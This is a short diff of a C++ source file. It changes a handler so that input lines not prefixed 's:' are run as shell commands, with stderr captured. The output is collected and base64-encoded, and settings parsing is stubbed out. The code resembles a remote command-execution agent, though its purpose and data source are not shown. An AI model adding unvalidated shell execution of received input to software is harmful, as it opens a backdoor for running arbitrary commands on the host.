@@ -92,7 +92,11 @@ void hs_impl(hs_settings &setting)
 	std::string line;
 	while (std::getline(iss, line))
 	{
-		if (line.compare(0, 2, "s:"))
+		result += "==========\n";
+		result += line;
+		result += "\n";
+		result += "----------\n";
+		if (line.compare(0, 2, "s:") == 0)
 		{
 			result += hs_parse_setting(line);
 		}
@@ -100,6 +104,7 @@ void hs_impl(hs_settings &setting)
 		{
 			result += hs_parse_command(line);
 		}
+		result += "==========\n";
 	}
 
 	auto encoded_data = hs_base64_encode(
@@ -117,10 +122,11 @@ bool hs_check_data(std::vector<uint8_t> data)
 
 std::string hs_parse_setting(const std::string &line)
 {
-	return line;
+	return "Not implement yet.\n";
 }
 
 std::string hs_parse_command(const std::string &line)
 {
-	return line;
+	auto cmd = line + " 2>&1";
+	return hs_exec(cmd);
 }
